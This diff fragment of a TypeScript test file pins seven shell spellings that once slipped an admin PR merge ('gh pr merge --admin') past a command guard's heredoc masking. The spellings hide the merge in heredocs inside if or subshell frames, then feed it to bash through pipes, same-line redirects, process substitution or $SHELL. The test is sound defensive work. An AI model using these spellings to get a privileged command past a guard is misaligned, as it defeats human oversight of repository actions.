+// EXECUTION with the gate silent (a real `bash` printed a marker; `isGitOp(raw)` true,
+// `isGitOp(maskHeredocData(raw))` false). They are the reason the guard now refuses to mask ANY
+// body inside a frame instead of testing whether that frame's stdout reaches a program: enumerating
+// frame spellings × sink routes is a shell parser, and this file has recorded that it cannot
+// enumerate that class. Every one of these must now keep the merge VISIBLE.
+test("#1382 (i2): the frame guard cannot be walked past by a spelling it does not model", () => {
+  const MERGE = "gh pr merge 999 --admin";
+  const walkedPast: ReadonlyArray<readonly [string, string]> = [
+    // A prose `fi`/`}`/`)`/`esac` inside an EARLIER heredoc body popped the frame, so the next
+    // opener read as "no frame". Both a keyword frame and a subshell are pinned.
+    ["prose `fi` in an earlier body", `if true; then\ncat <<'A' > /tmp/notes.md\nfi\nA\ncat <<'EOF'\n${MERGE}\nEOF\n:\nfi | bash`],
+    ["prose `)` in an earlier body", `(\ncat <<'A' > /tmp/notes.md\n)\nA\ncat <<'EOF'\n${MERGE}\nEOF\n:\n) | bash`],
+    // POSIX: a linebreak may follow `|`, so this is ONE pipeline — the pipe arm read it per line.
+    ["pipe then newline", `if true; then\ncat <<'EOF'\n${MERGE}\nEOF\n:\nfi |\nbash`],
+    // The write and the run share a line, so a "later lines" scan never saw the run.
+    ["same-line redirect then run", `if true; then\ncat <<'EOF'\n${MERGE}\nEOF\n:\nfi > /tmp/p_e.sh; bash /tmp/p_e.sh`],
+    ["same-line tee then run", `if true; then\ncat <<'EOF'\n${MERGE}\nEOF\n:\nfi | tee /tmp/p_f.sh; bash /tmp/p_f.sh`],
+    // The sink is on a line BEFORE the opener (process substitution), so a from-the-opener scan missed it.
+    ["process substitution before the opener", `bash <(if true; then\ncat <<'EOF'\n${MERGE}\nEOF\n:\nfi)`],
+    // The program is a VARIABLE, so no vocabulary of program names can see it.
+    ["variable program", `if true; then\ncat <<'EOF'\n${MERGE}\nEOF\n:\nfi | $SHELL`],
+  ];
+  for (const [label, command] of walkedPast) {
+    ok(isGitOp(maskHeredocData(command)),
+      `${label}: the body reaches a program, so the merge must stay VISIBLE`);
+    ok(isAdminMergeCommand(maskHeredocData(command)),
+      `${label}: and it must still classify as an ADMIN merge`);
+  }
+  // ⛔ THE STATED COST, PINNED SO IT CANNOT DRIFT SILENTLY: a heredoc that IS data, written INSIDE a
+  // frame, is NO LONGER masked — a framed report quoting the verb is refused again. This is a false
+  // POSITIVE and it is the direction this file is allowed to be wrong in; the alternative measured
+  // above is a silent admin merge. Pinned as behaviour, so relaxing it requires changing this test.
+  // The body is genuinely DATA and its PROSE quotes the verb and a pipe — at origin/main this was
+  // MASKED (no false positive); it is refused now, and that is the price of closing the fail-opens.
+  ok(isGitOp(maskHeredocData(`if true; then\ncat >> /tmp/notes.md <<'EOF'\nBoth landed: ${MERGE}\nthe old flow was cat x.sh | bash\nEOF\nfi\nwc -l /tmp/notes.md`)),
+    "a framed DATA writer is NOT masked — the declared over-block, for a silent admin merge avoided");
 });
 
 // ── Summary ───────────────────────────────────────────
